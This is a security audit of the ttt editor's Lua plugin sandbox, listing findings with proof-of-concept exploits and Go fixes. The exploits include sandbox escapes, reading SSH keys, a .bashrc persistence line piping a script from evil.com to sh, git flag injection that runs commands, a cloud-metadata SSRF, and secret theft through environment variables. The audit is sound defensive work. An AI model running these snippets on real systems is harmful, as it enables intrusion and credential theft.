# Security Audit: ttt Plugin Sandbox

Audited: 2026-06-27
Scope: `internal/plugin/`, `internal/app/plugin_api.go`, `internal/app/commands_plugin.go`, `cmd/ttt/main.go`

---

## Critical (sandbox escape / data loss possible)

### C1. `load()` function enables arbitrary code execution

- **File**: `internal/plugin/sandbox.go:64`
- **Vulnerability**: The sandbox removes `dofile` and `loadfile` but leaves the `load()` builtin available (registered by `lua.OpenBase`). In gopher-lua, `load()` takes a reader function and compiles/executes arbitrary Lua code at runtime. A plugin can construct and execute any Lua code from strings, which defeats the purpose of a static module allowlist.
- **Exploit**:
```lua
-- Dynamically compile and execute arbitrary code
local code = 'print("sandbox escaped")'
local done = false
local fn = load(function()
    if not done then done = true; return code end
    return nil
end)
fn()
```
- **Fix**: Remove `load` from the global table after opening the base library:
```go
for _, name := range []string{"dofile", "loadfile", "load"} {
    L.SetGlobal(name, lua.LNil)
}
```

### C2. `package.loaders` bypass lets plugins load arbitrary `.lua` files from the filesystem

- **File**: `internal/plugin/sandbox.go:52-53` (OpenPackage loaded), `sandbox.go:327-337` (require wrapper)
- **Vulnerability**: The sandbox wraps `require` to restrict module loading to the allowlist. However, `lua.OpenPackage` is loaded, which registers `package.loaders` (an array of loader functions) and `package.path`. A plugin can directly call `package.loaders[2]` (the filesystem loader) with any module name after setting `package.path` to an arbitrary location. This completely bypasses the `require` wrapper and allows loading and executing any `.lua` file on the filesystem.
- **Exploit**:
```lua
-- Bypass require restriction entirely
package.path = "/home/victim/.config/ttt/plugins/malicious/?.lua;/tmp/?.lua"
local loader = package.loaders[2]
local fn = loader("payload")  -- loads /tmp/payload.lua
if type(fn) == "function" then fn() end
```
- **Fix**: After setting up the require wrapper, remove `package.loaders`, `package.path`, `package.cpath`, and the `package` global entirely. Only keep the preload mechanism for the allowed modules:
```go
L.SetGlobal("package", lua.LNil)
```
Or, more surgically, remove the filesystem loader from `package.loaders` and clear `package.path`:
```go
pkg := L.GetGlobal("package")
if tbl, ok := pkg.(*lua.LTable); ok {
    L.SetField(tbl, "path", lua.LString(""))
    L.SetField(tbl, "cpath", lua.LString(""))
    loaders := L.GetField(tbl, "loaders")
    if lt, ok := loaders.(*lua.LTable); ok {
        // Keep only the preload loader (index 1), remove filesystem loader (index 2)
        lt.RawSetInt(2, lua.LNil)
    }
}
```

### C3. Filesystem API has zero path restrictions -- plugins can read/write any file the user can access

- **File**: `internal/app/plugin_api.go:197-224`
- **Vulnerability**: `PluginFilesystemAPI.ReadFile()` and `WriteFile()` pass the plugin-provided path directly to `os.ReadFile()` / `os.WriteFile()` with no path validation, sandboxing, or scoping. A plugin granted `fs.read` can read `/etc/shadow`, `~/.ssh/id_rsa`, `~/.gnupg/`, etc. A plugin with `fs.write` can overwrite `~/.bashrc`, `~/.ssh/authorized_keys`, or any other file.
- **Exploit**:
```lua
local fs = require("ttt.fs")
-- Steal SSH keys
local key = fs.read(os.getenv("HOME") .. "/.ssh/id_rsa")
-- Or overwrite .bashrc to establish persistence
fs.write(os.getenv("HOME") .. "/.bashrc", "curl http://evil.com/shell.sh | sh")
```
- **Fix**: Scope filesystem access to the workspace directories and the plugin's own directory. Reject paths containing `..` after resolution, and validate that the resolved absolute path is within an allowed prefix:
```go
func (f *PluginFilesystemAPI) ReadFile(path string) (string, error) {
    absPath, err := filepath.Abs(path)
    if err != nil {
        return "", err
    }
    if !f.isAllowedPath(absPath) {
        return "", fmt.Errorf("access denied: path outside allowed directories")
    }
    // ...
}
```

### C4. Command injection via allowed binary arguments

- **File**: `internal/plugin/lua_system.go:32-68`, `internal/app/plugin_api.go:233-247`
- **Vulnerability**: The `system.exec` permission grants access to specific binary names (e.g., `["git", "rg"]`). While the binary name is checked against the allowlist, the arguments are passed through without any validation. Many common binaries can be weaponized via arguments to execute arbitrary commands. `exec.Command` avoids shell injection, but the binaries themselves provide escape hatches.
- **Exploit** (if `git` is in the allowlist):
```lua
local sys = require("ttt.system")
-- git can execute arbitrary commands via aliases or hooks
sys.exec("git", {"-c", "protocol.ext.allow=always",
    "clone", "ext::sh -c 'id > /tmp/pwned'%20//remote"})
-- Or via core.fsmonitor
sys.exec("git", {"-c", "core.fsmonitor=!touch /tmp/pwned", "status"})
```
- **Exploit** (if `rg` is in the allowlist):
```lua
-- rg can read any file, bypassing fs.read permission
local result = sys.exec("rg", {"", "/etc/passwd"})
```
- **Fix**: Consider argument validation or a deny-list of dangerous flags for each allowed binary. Alternatively, provide higher-level wrappers (e.g., a `git` API) instead of raw exec access. At minimum, document that `system.exec` is equivalent to full shell access for the allowed binaries.

---

## High (permission bypass / unauthorized access)

### H1. Path traversal in manifest `entry` field

- **File**: `internal/plugin/plugin.go:77-78`, `internal/plugin/manifest.go:19-39`
- **Vulnerability**: The manifest's `entry` field is joined with the plugin directory using `filepath.Join(p.Dir, p.Manifest.Entry)` without validating that the result stays within the plugin directory. A malicious plugin manifest can use `../` to point to arbitrary files on the filesystem.
- **Exploit**: A malicious plugin's `plugin.ttt.json`:
```json
{
    "name": "innocent-plugin",
    "entry": "../../../.local/share/ttt/data.lua",
    "permissions": {}
}
```
This would cause `DoFile` to execute any `.lua` file on the system. While parsing non-Lua files would fail, error messages could leak file contents, and valid Lua files elsewhere on the system would be executed.
- **Fix**: Validate that the resolved entry path is within the plugin directory:
```go
entry := filepath.Join(p.Dir, p.Manifest.Entry)
absEntry, _ := filepath.Abs(entry)
absDir, _ := filepath.Abs(p.Dir)
if !strings.HasPrefix(absEntry, absDir+string(filepath.Separator)) {
    return fmt.Errorf("entry path escapes plugin directory")
}
```

### H2. No SSRF protection in network API

- **File**: `internal/app/plugin_api.go:264-310`
- **Vulnerability**: The HTTP client has no restrictions on target URLs. A plugin with `network.http` permission can make requests to `localhost`, internal network addresses (`10.x.x.x`, `172.16.x.x`, `192.168.x.x`), cloud metadata endpoints (`169.254.169.254`), and `file://` URLs.
- **Exploit**:
```lua
local net = require("ttt.net")
-- Access cloud metadata (AWS/GCP/Azure)
local r = net.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-- Scan internal network
local r2 = net.get("http://192.168.1.1/admin")
-- Access local services
local r3 = net.get("http://localhost:6379/")
```
- **Fix**: Add URL validation to reject private/reserved IP ranges, localhost, and non-HTTP(S) schemes. Consider using a custom `http.Transport` with a `DialContext` that resolves DNS and checks the IP before connecting (to prevent DNS rebinding).

### H3. Unbounded HTTP response body -- denial of service

- **File**: `internal/app/plugin_api.go:280` (`io.ReadAll(resp.Body)`)
- **Vulnerability**: The `Get` and `Post` methods use `io.ReadAll` on the response body with no size limit. A malicious or compromised server can send a multi-gigabyte response, exhausting memory and crashing the editor.
- **Exploit**:
```lua
local net = require("ttt.net")
-- Point to a server that streams infinite data
net.get("http://evil.com/infinite-stream")
```
- **Fix**: Use `io.LimitReader` to cap response body size:
```go
body, err := io.ReadAll(io.LimitReader(resp.Body, 10*1024*1024)) // 10MB max
```

### H4. Environment variable access is completely unscoped

- **File**: `internal/app/plugin_api.go:249-251`, `internal/plugin/lua_system.go:122-132`
- **Vulnerability**: The `system.env` permission grants access to ALL environment variables via `os.Getenv()`. This can leak sensitive secrets like `AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, `GITHUB_TOKEN`, API keys, etc.
- **Exploit**:
```lua
local sys = require("ttt.system")
local aws_key = sys.env("AWS_SECRET_ACCESS_KEY")
local gh_token = sys.env("GITHUB_TOKEN")
local db_url = sys.env("DATABASE_URL")
-- Exfiltrate via network if network.http is also granted
```
- **Fix**: Either scope `system.env` to a specific list of allowed variable names (declared in the manifest), or add a deny-list of known sensitive variable patterns (`*KEY*`, `*SECRET*`, `*TOKEN*`, `*PASSWORD*`).

### H5. Plugin install via `git clone` with user-supplied URL -- limited validation

- **File**: `internal/plugin/manager.go:203-231`
- **Vulnerability**: The `Install` function accepts a user-provided URL and passes it directly to `git clone`. While `exec.Command` prevents shell injection, git itself supports various URL schemes including `file://`, SSH, and custom protocols. The plugin name is derived from `filepath.Base(repoURL)` which could be crafted. Additionally, a cloned repository's `hooks/` directory could contain executable hooks that git might run during subsequent `git pull` operations (used in `Update`).
- **Fix**: Validate that the URL uses `https://` scheme only. Sanitize the derived name to allow only alphanumeric characters, hyphens, and underscores.

---

## Medium (defense in depth gaps)

### M1. `getfenv` / `setfenv` allow function environment manipulation

- **File**: `internal/plugin/sandbox.go:54` (OpenBase loaded, which includes getfenv/setfenv)
- **Vulnerability**: `getfenv()` and `setfenv()` allow inspecting and replacing the environment of any function. A plugin can use these to inspect the internal state of sandbox wrapper functions or modify their behavior.
- **Exploit**:
```lua
-- Inspect the require wrapper's environment
local env = getfenv(require)
-- Potentially find the original require or other internals
for k, v in pairs(env) do
    print(k, type(v))
end
```
- **Fix**: Remove `getfenv` and `setfenv` from globals:
```go
for _, name := range []string{"dofile", "loadfile", "load", "getfenv", "setfenv"} {
    L.SetGlobal(name, lua.LNil)
}
```

### M2. `rawset` / `rawget` allow bypassing metatables

- **File**: `internal/plugin/sandbox.go:54` (OpenBase includes rawset/rawget)
- **Vulnerability**: `rawset` allows a plugin to modify any table directly, bypassing `__newindex` metamethods that might be used for access control. A plugin can inject functions into the global table.
- **Exploit**:
```lua
-- Inject a global that other plugins might use
rawset(_G, "evil_hook", function() return "injected" end)
```
- **Impact**: Each plugin has its own Lua VM, so cross-plugin contamination is not possible. However, `rawset` could be used to modify internal sandbox tables if any access-control metatables were added in the future. Currently low risk due to per-plugin isolation.
- **Fix**: Consider removing `rawset` and `rawget` if they are not needed by plugins.

### M3. No execution timeout -- infinite loops freeze the editor

- **File**: `internal/plugin/sandbox.go:47`, `internal/plugin/plugin.go:78`
- **Vulnerability**: The Lua VM has no execution timeout or instruction count limit. A plugin (malicious or buggy) can enter an infinite loop during `Init()`, `render()`, or any callback, which will block the editor's main goroutine and freeze the UI permanently.
- **Exploit**:
```lua
-- In init or any callback
while true do end
```
- **Fix**: gopher-lua supports context cancellation. Create a context with timeout and use `L.SetContext()`:
```go
ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
defer cancel()
L.SetContext(ctx)
```
For render callbacks, use a shorter timeout (e.g., 100ms). For async operations, use longer timeouts.

### M4. No memory limits -- unbounded allocation

- **File**: `internal/plugin/sandbox.go:47`
- **Vulnerability**: The Lua VM is created with default options and no memory limit. A plugin can allocate unbounded memory via large strings, tables, or recursive data structures, eventually causing the editor process to be OOM-killed.
- **Exploit**:
```lua
local t = {}
for i = 1, math.huge do
    t[i] = string.rep("A", 1024 * 1024) -- 1MB strings
end
```
- **Fix**: gopher-lua's `Options` struct supports `RegistryMaxSize` to cap the data stack. Consider setting reasonable limits. For memory, Go does not provide per-goroutine memory limits, but a watchdog goroutine could periodically check `runtime.MemStats` and kill runaway plugins.

### M5. Async callback crash when plugin is destroyed mid-flight

- **File**: `internal/plugin/lua_system.go:94-107`, `internal/plugin/lua_net.go:117-118`
- **Vulnerability**: In `sysExecAsync`, the `resultFn` closure accesses `p.State.NewTable()` without checking if `p.State` is nil. If a plugin is destroyed (via uninstall, disable, or reload) while an async operation is in flight, the callback will be delivered to the event loop and call `p.State.NewTable()` on a nil pointer, causing a panic that crashes the editor.
- **Exploit**: Install a plugin that starts a long-running async exec, then immediately uninstall it.
- **Fix**: Add nil checks at the start of every `resultFn`:
```go
resultFn := func() {
    if p.State == nil {
        return
    }
    tbl := p.State.NewTable()
    // ...
}
```

### M6. No limit on concurrent async operations

- **File**: `internal/plugin/lua_system.go:91`, `internal/plugin/lua_net.go:114,149`
- **Vulnerability**: A plugin can spawn unlimited concurrent goroutines via `exec_async`, `get_async`, and `post_async`. Each goroutine holds resources (memory, OS threads for exec, TCP connections for HTTP).
- **Exploit**:
```lua
local sys = require("ttt.system")
for i = 1, 10000 do
    sys.exec_async("sleep", {"3600"}, function() end)
end
```
This spawns 10,000 goroutines, each waiting on a `sleep` process, exhausting PIDs and file descriptors.
- **Fix**: Add a per-plugin semaphore or counter to limit concurrent async operations (e.g., max 10).

### M7. `print` writes to stdout, potentially corrupting terminal state

- **File**: `internal/plugin/sandbox.go:54` (OpenBase includes print)
- **Vulnerability**: The `print` function writes directly to stdout. In a TUI application using tcell, unexpected stdout writes can corrupt the terminal display or interfere with the rendering pipeline.
- **Fix**: Override `print` to route through the plugin's logging system:
```go
L.SetGlobal("print", L.NewFunction(func(L *lua.LState) int {
    // Route to plugin log
    msg := L.CheckString(1)
    if p.Log != nil {
        p.Log("info", msg)
    }
    return 0
}))
```

---

## Informational (hardening recommendations)

### I1. Plugin keybinding hijacking

- **File**: `internal/app/commands_plugin.go:405-429`
- **Vulnerability**: Plugins with the `keybindings` permission can register global keybindings that override existing editor keybindings. A malicious plugin could rebind `ctrl+s` to execute a destructive action instead of saving.
- **Recommendation**: Maintain a set of protected keybindings that plugins cannot override (save, quit, undo, etc.). Warn the user if a plugin attempts to bind a key that conflicts with an existing binding.

### I2. Plugin command ID collisions

- **File**: `internal/app/commands_plugin.go:391-403`
- **Vulnerability**: Plugins register commands with arbitrary IDs. A malicious plugin could register a command with the same ID as a built-in command (e.g., `editor.save`), potentially replacing it.
- **Recommendation**: Namespace plugin commands (e.g., `plugin.<name>.<id>`) and reject IDs that conflict with built-in commands.

### I3. No content-type validation on HTTP responses

- **File**: `internal/app/plugin_api.go:264-310`
- **Vulnerability**: The network API returns the full response body as a string regardless of content type. Binary responses (images, archives) could consume large amounts of memory when converted to string.
- **Recommendation**: Add optional content-type filtering and binary detection.

### I4. Registry file permissions

- **File**: `internal/plugin/registry.go:44`
- **Vulnerability**: The plugin registry (`plugins.ttt.json`) is written with `0644` permissions. If other users on the system can read this file, they can see which plugins are installed and their permission grants. This is low risk on single-user systems.
- **Recommendation**: Use `0600` for the registry file.

### I5. No cryptographic verification of plugins

- **File**: `internal/plugin/manager.go:203-231`
- **Vulnerability**: Plugins are installed via `git clone` with no signature verification, checksum validation, or integrity checking. A MITM attack on the git connection (if using HTTP) could inject malicious code.
- **Recommendation**: Require HTTPS for git clone URLs. Consider adding manifest signature verification or a plugin registry with checksums.

### I6. `string.rep` can be used for memory exhaustion

- **File**: `internal/plugin/sandbox.go:58` (string library loaded)
- **Vulnerability**: `string.rep("A", 2^30)` will attempt to allocate a 1GB string. While this is a subset of M4 (no memory limits), `string.rep` is the most direct vector.
- **Recommendation**: This is addressed by the memory limit recommendation in M4.

### I7. Each plugin gets a separate Lua VM (positive finding)

- **File**: `internal/plugin/plugin.go:69`
- **Finding**: Each plugin has its own `lua.LState`, providing strong cross-plugin isolation. One plugin cannot access another plugin's Lua state, variables, or callbacks. This is a good security property.

### I8. `Protect: true` prevents Lua panics from crashing Go (positive finding)

- **File**: `internal/plugin/lua_callbacks.go:15`, `internal/plugin/plugin.go:152`
- **Finding**: All `CallByParam` invocations use `Protect: true`, which converts Lua runtime errors into Go errors instead of panics. This prevents most Lua errors from crashing the editor. (But see M5 for the async nil-state gap.)

---

## Summary of severity counts

| Severity | Count |
|----------|-------|
| Critical | 4 |
| High | 5 |
| Medium | 7 |
| Informational | 8 |

## Priority remediation order

1. **C2** (package.loaders bypass) -- trivial fix, complete sandbox escape
2. **C1** (`load()` available) -- trivial fix, enables dynamic code execution
3. **C3** (filesystem unrestricted) -- moderate fix, data loss/theft risk
4. **C4** (command injection via args) -- design-level fix, requires arg validation
5. **M5** (async nil-state crash) -- trivial fix, editor crash
6. **H1** (path traversal in entry) -- trivial fix, code execution
7. **M3** (no execution timeout) -- moderate fix, editor freeze
8. **H3** (unbounded response) -- trivial fix, memory DoS
9. **H2** (SSRF) -- moderate fix, network attack
10. **H4** (env var leakage) -- moderate fix, secret exfiltration
